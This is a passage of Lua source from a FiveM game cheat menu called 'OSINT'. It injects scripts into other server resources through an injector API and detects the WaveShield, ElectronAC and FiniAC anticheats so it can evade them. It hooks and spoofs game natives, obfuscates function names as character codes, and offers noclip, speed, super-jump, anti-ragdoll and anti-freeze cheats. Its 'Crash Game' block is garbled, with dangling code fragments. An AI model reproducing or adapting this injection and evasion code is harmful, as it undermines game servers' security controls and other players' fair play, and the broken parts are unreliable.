                                            local slow = IsControlPressed(0, 19)
                                            if sprint then speed = speed + 1 end
                                            if slow then speed = 0.10 end

                                            local forward = IsControlPressed(0, 32)
                                            local back = IsControlPressed(0, 269)
                                            local left = IsControlPressed(0, 34)
                                            local right = IsControlPressed(0, 9)
                                            local up = IsControlPressed(0, 22)
                                            local down = IsControlPressed(0, 62)

                                            if forward then
                                                coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                            elseif back then
                                                coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                            end

                                            if left then
                                                coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                            elseif right then
                                                coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                            end

                                            if up then
                                                coords = coords + vector3(0.0, 0.0, speed)
                                            elseif down then
                                                coords = coords - vector3(0.0, 0.0, speed)
                                            end

                                            SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                            SetEntityHeading(entity, heading)
                                            ::continue::
                                        end
                                    end)
                                else
                                    _G.OSINTNoclipEnabled = true
                                    _G.OSINTNoclipSpeed = ]] .. sliderValue .. [[
                                end
                            ]])
                                elseif GetResourceState('ElectronAC') == 'started' or GetResourceState('FiniAC') == 'started' then
                                        MachoInjectResource2(3, GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            local function RotationToDirection(rot)
                                                local z = math.rad(rot.z)
                                                local x = math.rad(rot.x)
                                                local num = math.abs(math.cos(x))
                                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                            end

                                            local function GetRightVector(rot)
                                                local z = math.rad(rot.z)
                                                return vector3(math.cos(z), math.sin(z), 0.0)
                                            end

                                            local function Clamp(val, min, max)
                                                if val < min then return min end
                                                if val > max then return max end
                                                return val
                                            end

                                            local function GetGroundZForCoords(x, y, z)
                                                local found, groundZ = GetGroundZFor_3dCoord(x, y, z, false)
                                                if found then return groundZ end
                                                return z
                                            end

                                            if not _G.inNoClip then
                                                _G.inNoClip = true
                                                _G.noclipping = true
                                                _G.OSINTNoclipSpeed = ]] .. sliderValue .. [[
                                                _G.noclipCamera = nil
                                                _G.cameraReady = false
                                                _G.originalCoords = nil

                                                local function StartNoclip()
                                                    local playerPed = PlayerPedId()
                                                    _G.originalCoords = GetEntityCoords(playerPed)
                                                    _G.noclipCamera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
                                                    SetCamCoord(_G.noclipCamera, _G.originalCoords.x, _G.originalCoords.y, _G.originalCoords.z + 1.0)
                                                    SetCamRot(_G.noclipCamera, 0.0, 0.0, GetEntityHeading(playerPed), 2)
                                                    RenderScriptCams(true, false, 0, true, true)
                                                    SetEntityVisible(playerPed, false, false)
                                                    SetEntityInvincible(playerPed, true)
                                                    SetEntityCollision(playerPed, false, false)
                                                    TaskStandStill(playerPed, -1)
                                                    CreateThread(function()
                                                        Wait(550)
                                                        _G.cameraReady = true
                                                    end)
                                                end

                                                local function Movement()
                                                    if not _G.noclipCamera or not _G.cameraReady then return end
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local camRot = GetCamRot(_G.noclipCamera, 2)
                                                    local speed = _G.OSINTNoclipSpeed or ]] .. sliderValue .. [[
                                                    if IsControlPressed(0, 21) then speed = speed + 1 end
                                                    if IsControlPressed(0, 19) then speed = 0.10 end
                                                    local forward = RotationToDirection(camRot)
                                                    local right = GetRightVector(camRot)
                                                    local moveX, moveY, moveZ = 0, 0, 0
                                                    if IsControlPressed(0, 32) then
                                                        moveX = moveX + forward.x * speed
                                                        moveY = moveY + forward.y * speed
                                                        moveZ = moveZ + forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 269) then
                                                        moveX = moveX - forward.x * speed
                                                        moveY = moveY - forward.y * speed
                                                        moveZ = moveZ - forward.z * speed
                                                    end
                                                    if IsControlPressed(0, 34) then
                                                        moveX = moveX - right.x * speed
                                                        moveY = moveY - right.y * speed
                                                    end
                                                    if IsControlPressed(0, 9) then
                                                        moveX = moveX + right.x * speed
                                                        moveY = moveY + right.y * speed
                                                    end
                                                    if IsControlPressed(0, 22) then
                                                        moveZ = moveZ + speed
                                                    end
                                                    if IsControlPressed(0, 62) then
                                                        moveZ = moveZ - speed
                                                    end
                                                    SetCamCoord(_G.noclipCamera, camCoords.x + moveX, camCoords.y + moveY, camCoords.z + moveZ)
                                                    local x = GetDisabledControlNormal(0, 1)
                                                    local y = GetDisabledControlNormal(0, 2)
                                                    local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                                                    local newYaw = camRot.z - x * 5
                                                    SetCamRot(_G.noclipCamera, newPitch, camRot.y, newYaw, 2)
                                                    SetFocusPosAndVel(camCoords.x, camCoords.y, camCoords.z, 0.0, 0.0, 0.0)
                                                end

                                                CreateThread(function()
                                                    StartNoclip()
                                                    while _G.inNoClip do
                                                        Wait(0)
                                                        if _G.noclipping then
                                                            Movement()
                                                        else
                                                            Wait(500)
                                                        end
                                                    end
                                                end)
                                            else
                                                _G.noclipping = true
                                                _G.OSINTNoclipSpeed = ]] .. sliderValue .. [[
                                            end
                                        ]])
                                    else
                                        MachoInjectResource2(3, GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            _G.OSINTNoclipSpeed = ]] .. sliderValue .. [[
                                            if not _G.OSINTNoclipThreadRunning then
                                                _G.OSINTNoclipEnabled = true
                                                _G.OSINTNoclipThreadRunning = true
                                                function hNative(nativeName, newFunction)
                                                    local originalNative = _G[nativeName]
                                                    if not originalNative or type(originalNative) ~= "function" then return end
                                                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                                end
                                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsPedFalling", function(originalFn, ...) return true end)
                                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                                hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativeHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameplayCamRelativePitch", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                                                hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                                                hNative("GetGameTimer", function(originalFn, ...) return 100 end)
                                                hNative("IsPedJumpingOutOfVehicle", function(originalFn, ...) return true end)
                                                hNative("IsPedClimbing", function(originalFn, ...) return true end)
                                                hNative("GetPedParachuteState", function(originalFn, ...) return 1 end)
                                                CreateThread(function()
                                                    while _G.OSINTNoclipThreadRunning do
                                                        Wait(0)
                                                        if not _G.OSINTNoclipEnabled then
                                                            Wait(500)
                                                            goto continue
                                                        end
                                                        local ped = PlayerPedId()
                                                        if not DoesEntityExist(ped) then goto continue end
                                                        local vehicle = GetVehiclePedIsIn(ped, false)
                                                        local entity = (vehicle ~= 0 and vehicle) or ped
                                                        if not DoesEntityExist(entity) then goto continue end
                                                        local coords = GetEntityCoords(entity, true)
                                                        local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(entity)
                                                        local pitch = GetGameplayCamRelativePitch()
                                                        local dx = -math.sin(heading * math.pi / 180.0)
                                                        local dy = math.cos(heading * math.pi / 180.0)
                                                        local dz = math.sin(pitch * math.pi / 180.0)
                                                        local len = math.sqrt(dx * dx + dy * dy + dz * dz)
                                                        if len ~= 0 then
                                                            dx, dy, dz = dx / len, dy / len, dz / len
                                                        end
                                                        local speed = _G.OSINTNoclipSpeed or 0.25
                                                        if IsControlPressed(0, 21) then speed = speed + 1 end
                                                        if IsControlPressed(0, 19) then speed = 0.10 end
                                                        if IsControlPressed(0, 32) then
                                                            coords = coords + vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 269) then
                                                            coords = coords - vector3(speed * dx, speed * dy, speed * dz)
                                                        end
                                                        if IsControlPressed(0, 34) then
                                                            coords = coords + vector3(-speed * dy, speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 9) then
                                                            coords = coords + vector3(speed * dy, -speed * dx, 0.0)
                                                        end
                                                        if IsControlPressed(0, 22) then
                                                            coords = coords + vector3(0.0, 0.0, speed)
                                                        end
                                                        if IsControlPressed(0, 62) then
                                                            coords = coords - vector3(0.0, 0.0, speed)
                                                        end
                                                        SetEntityCoordsNoOffset(entity, coords.x, coords.y, coords.z, true, true, true)
                                                        SetEntityHeading(entity, heading)
                                                        ::continue::
                                                    end
                                                end)
                                            else
                                                _G.OSINTNoclipEnabled = true
                                                _G.OSINTNoclipSpeed = ]] .. sliderValue .. [[
                                            end
                                        ]])
                                    end
                                else
                                if GetResourceState("WaveShield") == 'started' then
                                MachoInjectResourceRaw(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                    _G.OSINTNoclipEnabled = false
                                    _G.OSINTNoclipThreadRunning = false
                                ]])
                            elseif GetResourceState('ElectronAC') == 'started' or GetResourceState('FiniAC') == 'started' then
                                        MachoInjectResource2(3, GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            if _G.inNoClip then
                                                _G.inNoClip = false
                                                _G.noclipping = false
                                                _G.cameraReady = false
                                                local playerPed = PlayerPedId()
                                                if _G.noclipCamera then
                                                    local camCoords = GetCamCoord(_G.noclipCamera)
                                                    local valid, groundZ = GetGroundZFor_3dCoord(camCoords.x, camCoords.y, camCoords.z, false)
                                                    local targetCoords
                                                    if valid and camCoords.z > -1000.0 and camCoords.z < 10000.0 then
                                                        targetCoords = vector3(camCoords.x, camCoords.y, groundZ + 1.0)
                                                    else
                                                        targetCoords = GetEntityCoords(playerPed)
                                                    end
                                                    SetEntityCoordsNoOffset(playerPed, targetCoords.x, targetCoords.y, targetCoords.z, true, true, true)
                                                    RenderScriptCams(false, false, 0, true, true)
                                                    DestroyCam(_G.noclipCamera, false)
                                                    _G.noclipCamera = nil
                                                else
                                                    local pedCoords = GetEntityCoords(playerPed)
                                                    SetEntityCoordsNoOffset(playerPed, pedCoords.x, pedCoords.y, pedCoords.z, true, true, true)
                                                end
                                                SetEntityVisible(playerPed, true, true)
                                                SetEntityInvincible(playerPed, false)
                                                SetEntityCollision(playerPed, true, true)
                                                ClearPedTasksImmediately(playerPed)
                                                SetFocusEntity(playerPed)
                                            end
                                        ]])
                                    else
                                        MachoInjectResourceRaw(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            _G.OSINTNoclipEnabled = false
                                            _G.OSINTNoclipThreadRunning = false
                                        ]])
                                    end
                                end
                            end
                        },
                        { type = "slider-checkbox", label = "Freecam", scrollType = "onScroll", checked = false, value = 0.25, step = 0.25, min = 0.25, max = 5.0,
                            onSelect = function(sliderValue, checked)
                                self:ToggleFreecam(checked, sliderValue)
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Fast Run",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    OSINT:Notify("success", "OSINT", "Fast Run On", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("WaveShield") == "started" and "WaveShield" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.fastRunEnabled then
                                                _G.fastRunEnabled = true

                                                local GetPlayerPed_fn = g({71,101,116,80,108,97,121,101,114,80,101,100})
                                                local SetRun_fn = g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})
                                                local SetPedMove_fn = g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})
                                                local Wait_fn = g({87,97,105,116})

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[FastRun] Coroutine error:^7", err)
                                                                break
                                                            end
                                                            Wait_fn(1)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
                                                    while _G.fastRunEnabled do
                                                        local ped = GetPlayerPed_fn(-1)
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(ped, 1.49)
                                                            SetPedMove_fn(ped, 1.49)
                                                        end
                                                        Wait_fn(1)
                                                    end
                                                end)
                                            end
                                        ]])
                                    else
                                        MachoInjectResourceRaw(
                                            GetResourceState("monitor") == "started" and "monitor"
                                            or GetResourceState("ox_lib") == "started" and "ox_lib"
                                            or "any",
                                            [[
                                            if _G.FastRunActive == nil then _G.FastRunActive = false end
                                            if _G.FastRunThread == nil then
                                                _G.FastRunThread = true

                                                local CreateThread_fn = CreateThread
                                                local PlayerPedId_fn = PlayerPedId
                                                local SetRun_fn = SetRunSprintMultiplierForPlayer
                                                local SetMove_fn = SetPedMoveRateOverride

                                                CreateThread_fn(function()
                                                    while true do
                                                        Wait(0)
                                                        if not _G.FastRunActive then
                                                            Wait(500)
                                                            goto continue
                                                        end

                                                        local ped = PlayerPedId_fn()
                                                        if ped and ped ~= 0 then
                                                            SetRun_fn(PlayerId(), 1.49)
                                                            SetMove_fn(ped, 1.49)
                                                        end
                                                        ::continue::
                                                    end
                                                end)
                                            end

                                            _G.FastRunActive = true
                                        ]]
                                        )
                                    end
                                else
                                    OSINT:Notify("error", "OSINT", "Fast Run Off", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("monitor") == "started" and "monitor"
                                            or GetResourceState("ox_lib") == "started" and "ox_lib"
                                            or "any", [[
                                            _G.fastRunEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end
                                            local function g(n)
                                                return _G[decode(n)]
                                            end
                                            g({83,101,116,82,117,110,83,112,114,105,110,116,77,117,108,116,105,112,108,105,101,114,70,111,114,80,108,97,121,101,114})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                            g({83,101,116,80,101,100,77,111,118,101,82,97,116,101,79,118,101,114,114,105,100,101})(g({80,108,97,121,101,114,80,101,100,73,100})(), 1.0)
                                        ]])
                                    else
                                        MachoInjectResourceRaw("any", [[
                                            _G.FastRunActive = false
                                            SetRunSprintMultiplierForPlayer(PlayerId(), 1.0)
                                            SetPedMoveRateOverride(PlayerPedId(), 1.0)
                                        ]])
                                    end
                                end
                            end
                        },
                        { type = "checkbox", label = "Super Jump", checked = false,
                            onSelect = function(checked)
                                local WaveDih = GetResourceState("WaveShield") == "started"

                                local function decode(tbl)
                                    local s = ""
                                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                    return s
                                end

                                local function g(n)
                                    return _G[decode(n)]
                                end

                                local function enableSuperJump()
                                    if not _G.superJumpEnabled then
                                        _G.superJumpEnabled = true
                                        g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                                            while _G.superJumpEnabled do
                                                g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})())
                                                Wait(0)
                                            end
                                        end)
                                    end
                                end

                                local function disableSuperJump()
                                    _G.superJumpEnabled = false
                                    g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                end

                                if checked then
                                    if WaveDih then
                                        enableSuperJump()
                                    else
                                        MachoInjectResourceRaw("any", [[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superJumpEnabled then
                                                _G.superJumpEnabled = true
                                                g({67,114,101,97,116,101,84,104,114,101,97,100})(function()
                                                    while _G.superJumpEnabled do
                                                        g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})())
                                                        Wait(0)
                                                    end
                                                end)
                                            end
                                        ]])
                                    end
                                else
                                    if WaveDih then
                                        print("off")
                                        disableSuperJump()
                                    else
                                        MachoInjectResourceRaw("any", [[
                                            _G.superJumpEnabled = false
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            g({83,101,116,83,117,112,101,114,74,117,109,112,84,104,105,115,70,114,97,109,101})(g({80,108,97,121,101,114,73,100})(), 1.0)
                                        ]])
                                    end
                                end
                            end
                        },


                    }
                },
                {
                    label = "Miscellaneous",
                    tabs = {
                        { icon = "", type = "button", label = "Crash Game", desc = "Crashes your game",
                            onSelect = function()
                        MachoInjectResourceRaw("any", [[
                        function SimpleJsonEncode(value)
                            if type(value) == "table" then
                                local parts = {}
                                local isArray = true
                                local maxIndex = 0

                                for k, _ in pairs(value) do
                                    if type(k) ~= "number" or k < 1 or math.floor(k) ~= k then
                                        isArray = false
                                        break
                                    end
                                    maxIndex = math.max(maxIndex, k)
                                end
                                
                                if isArray then
                                    for i = 1, maxIndex do
                                        local v = value[i]
                                        if v == nil then
                                            parts[i] = "null"
                                        else
                                            parts[i] = SimpleJsonEncode(v)
                                        end
                                    end
                                    return "[" .. table.concat(parts, ",") .. "]"
                                else
                                    for k, v in pairs(value) do
                                        if type(k) == "string" then
                                            local encodedValue = SimpleJsonEncode(v)
                                            parts[#parts + 1] = "\"" .. k .. "\":" .. encodedValue
                                        end
                                    end
                                    return "{" .. table.concat(parts, ",") .. "}"
                                end
                            elseif type(value) == "string" then
                                return "\"" .. tostring(value):gsub("\"", "\\\"") .. "\""
                            elseif type(value) == "number" or type(value) == "boolean" then
                                return tostring(value)
                            elseif value == nil then
                                return "null"
                            else
                                return "\"[unserializable:" .. type(value) .. "]\""
                            end
                        end

                        function HookNative(nativeName, newFunction)
                            local originalNative = _G[nativeName]
                            if not originalNative or type(originalNative) ~= "function" then
                                return
                            end

                            _G[nativeName] = function(...)
                                local info = debug.getinfo(2, "Sln")
                                return newFunction(originalNative, ...)
                            end
                        end

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)

                            local args = {...}
                            local encodedArgs = {}

                            for i, arg in ipairs(args) do
                                encodedArgs[i] = SimpleJsonEncode(arg)
                            end

                            return originalFn(eventName, ...)
                        end)
                        ]])
                            end
                        },
                        { icon = "", type = "button", label = "Clear Screen Effects", desc = "Removes all screen effects",
                            onSelect = function()
                                print("Revive")
                            end
                        },
                        { icon = "", type = "button", label = "Suicide", desc = "This will kill you.",
                            onSelect = function()
                            local function RGybF0JqEt()
                                local aSdFgHjKlQwErTy = SetEntityHealth
                                aSdFgHjKlQwErTy(PlayerPedId(), 0)
                            end
                            RGybF0JqEt()
                        end
                        },
                        { icon = "", type = "button", label = "Force Ragdoll", desc = "This will ragdoll.",
                            onSelect = function()
                            MachoInjectResourceRaw("any", [[
                            local function awfAEDSADWEf()
                                local cWAmdjakwDksFD = SetPedToRagdoll
                                cWAmdjakwDksFD(PlayerPedId(), 3000, 3000, 0, false, false, false)
                            end

                            awfAEDSADWEf()
                            ]])
                            end
                        },
                        { icon = "", type = "button", label = "Remove Crutch", desc = "Remove Crutch is the server is using the correct resource",
                            onSelect = function()
                            MachoResourceStop("wasabi_crutch")
                            end
                        },
                        { icon = "", type = "scrollable", value = 1, values = { "Primary", "Secondary" }, label = "Clear Tasks", desc = "Clears the character's tasks",
                            onSelect = function(value)
                                if value == "Primary" then
                                    ClearPedTasksImmediately(PlayerPedId())
                                else
                                    if value == "Secondary" then
                                    ClearPedSecondaryTask(PlayerPedId())
                                end
                            end
                        end
                        },
                        { type = "divider", label = "Toggles" },
                        {
                            type = "checkbox",
                            label = "No Ragdoll",
                            checked = false,
                            desc = "This will prevent you from being ragdolled from admins or cheaters.",
                            onSelect = function(checked)
                                local waveStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                    or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                    or "any"

                                if checked then
                                    if waveStarted then
                                        OSINT:Notify("success", "OSINT", "No Ragdoll Enabled", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local setCanRagdoll = SetPedCanRagdoll
                                                local setRagdollOnCollision = SetPedRagdollOnCollision
                                                local setRagdollFromImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRagdoll = IsPedRagdoll
                                                local clearTasks = ClearPedTasksImmediately

                                                while noRagdollEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 then
                                                        setCanRagdoll(ped, false)
                                                        setRagdollOnCollision(ped, false)
                                                        setRagdollFromImpact(ped, false)
                                                        if isRagdoll(ped) then
                                                            clearTasks(ped)
                                                        end
                                                    end
                                                end

                                                local ped = getPed()
                                                if ped and ped ~= 0 then
                                                    setCanRagdoll(ped, true)
                                                    setRagdollOnCollision(ped, true)
                                                    setRagdollFromImpact(ped, true)
                                                end
                                            end)
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedRagdollOnCollision", function(originalFn, ...) return originalFn(...) end)
                                            hNative("SetPedCanRagdollFromPlayerImpact", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsPedRagdoll", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if noRagdollEnabled == nil then noRagdollEnabled = false end
                                            noRagdollEnabled = true

                                            local function startNoRagdoll()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local setCan = SetPedCanRagdoll
                                                local setColl = SetPedRagdollOnCollision
                                                local setImpact = SetPedCanRagdollFromPlayerImpact
                                                local isRag = IsPedRagdoll
                                                local clear = ClearPedTasksImmediately

                                                create(function()
                                                    while noRagdollEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 then
                                                            setCan(ped, false)
                                                            setColl(ped, false)
                                                            setImpact(ped, false)
                                                            if isRag(ped) then
                                                                clear(ped)
                                                            end
                                                        end
                                                        wait(0)
                                                    end

                                                    -- Restore
                                                    local ped = pedId()
                                                    if ped and ped ~= 0 then
                                                        setCan(ped, true)
                                                        setColl(ped, true)
                                                        setImpact(ped, true)
                                                    end
                                                end)
                                            end

                                            startNoRagdoll()
                                        ]])
                                        OSINT:Notify("success", "OSINT", "No Ragdoll Enabled (Fallback)", 3000)
                                    end
                                else
                                    if waveStarted then
                                        OSINT:Notify("success", "OSINT", "No Ragdoll Disabled", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                            noRagdollEnabled = false
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            noRagdollEnabled = false
                                        ]])
                                        OSINT:Notify("success", "OSINT", "No Ragdoll Disabled (Fallback)", 3000)
                                    end
                                end
                            end
                        },
                        {
                            type = "checkbox",
                            label = "Anti-Freeze",
                            checked = false,
                            desc = "This will prevent you from being frozen.",
                            onSelect = function(checked)
                                local waveStarted = GetResourceState("WaveShield") == 'started'
                                local targetRes = (GetResourceState("monitor") == "started" and "monitor")
                                    or (GetResourceState("ox_lib") == "started" and "ox_lib")
                                    or "any"

                                if checked then
                                    if waveStarted then
                                        OSINT:Notify("success", "OSINT", "Anti-Freeze Enabled", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function initFlow(cb)
                                                local co = coroutine.create(cb)
                                                local ok, err
                                                while coroutine.status(co) ~= "dead" do
                                                    ok, err = coroutine.resume(co)
                                                    if not ok then
                                                        print("WaveShield Coroutine error:", err)
                                                        break
                                                    end
                                                    Citizen.Wait(0)
                                                end
                                            end

                                            initFlow(function()
                                                local getPed = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clearTasks = ClearPedTasks

                                                while antiFreezeEnabled and not Unloaded do
                                                    Wait(0)
                                                    local ped = getPed()
                                                    if ped and ped ~= 0 and isFrozen(ped) then
                                                        unfreeze(ped, false)
                                                        clearTasks(ped)
                                                    end
                                                end
                                            end)
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            function hNative(nativeName, newFunction)
                                                local originalNative = _G[nativeName]
                                                if not originalNative or type(originalNative) ~= "function" then return end
                                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                            end

                                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                            hNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                                            hNative("ClearPedTasks", function(originalFn, ...) return originalFn(...) end)
                                            hNative("IsEntityPositionFrozen", function(originalFn, ...) return originalFn(...) end)
                                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                            if antiFreezeEnabled == nil then antiFreezeEnabled = false end
                                            antiFreezeEnabled = true

                                            local function startAntiFreeze()
                                                local create = CreateThread
                                                local wait = Wait
                                                local pedId = PlayerPedId
                                                local isFrozen = IsEntityPositionFrozen
                                                local unfreeze = FreezeEntityPosition
                                                local clear = ClearPedTasks

                                                create(function()
                                                    while antiFreezeEnabled and not Unloaded do
                                                        local ped = pedId()
                                                        if ped and ped ~= 0 and isFrozen(ped) then
                                                            unfreeze(ped, false)
                                                            clear(ped)
                                                        end
                                                        wait(0)
                                                    end
                                                end)
                                            end

                                            startAntiFreeze()
                                        ]])
                                        OSINT:Notify("success", "OSINT", "Anti-Freeze Enabled (Fallback)", 3000)
                                    end
                                else
                                    if waveStarted then 
                                        OSINT:Notify("error", "OSINT", "Anti-Freeze Disabled", 3000)
                                        Injection(GetResourceState("lb-phone") == "started" and "lb-phone" or "WaveShield", [[
                                            antiFreezeEnabled = false
                                        ]])
                                    else
                                        Injection(targetRes, [[
                                            antiFreezeEnabled = false
                                        ]])
                                        OSINT:Notify("error", "OSINT", "Anti-Freeze Disabled (Fallback)", 3000)
                                    end
                                end
                            end
                        },
                        { type = "checkbox", label = "Force Third Person", checked = false, desc = "This will force third person.",
                            onSelect = function(checked)
                                if checked then
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[


                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowVehicleCamViewMode", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetFollowPedCamViewMode", function(originalFn, ...) return originalFn(...) end)

                                if kJfGhTrEeWqAsDz == nil then kJfGhTrEeWqAsDz = false end
                                kJfGhTrEeWqAsDz = true

                                local function pqkTRWZ38y()
                                    local gKdNqLpYxMiV = CreateThread
                                    gKdNqLpYxMiV(function()
                                        while kJfGhTrEeWqAsDz and not Unloaded do
                                            local qWeRtYuIoPlMnBv = SetFollowPedCamViewMode
                                            local aSdFgHjKlQwErTy = SetFollowVehicleCamViewMode

                                            qWeRtYuIoPlMnBv(0)
                                            aSdFgHjKlQwErTy(0)
                                            Wait(0)
                                        end
                                    end)
                                end

                                pqkTRWZ38y()
                                ]])
                                else
                                Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
